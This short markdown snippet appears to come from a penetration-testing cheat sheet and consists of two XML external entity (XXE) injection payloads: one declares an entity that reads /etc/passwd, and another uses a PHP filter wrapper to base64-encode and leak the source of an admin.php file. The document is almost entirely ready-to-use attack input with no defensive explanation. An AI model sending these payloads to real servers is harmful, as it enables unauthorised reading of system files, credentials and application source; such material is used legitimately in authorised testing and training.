### Payloads Example : 

```xml
<?xml version="1.0" encoding="UTF-8"?>
  
<!DOCTYPE replace [<!ENTITY piyush SYSTEM "file:///etc/passwd"> ]>

<root><name>
  
</name><search>
  
&piyush;    # calling the function !!
  
</search></root>
```

#### Using PHP Filters : 

```xml
<?xml version="1.0" encoding="UTF-8"?>
  
<!DOCTYPE a [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/admin.php">]>
  
<root><name>1</name><search>&test;</search></root>
```


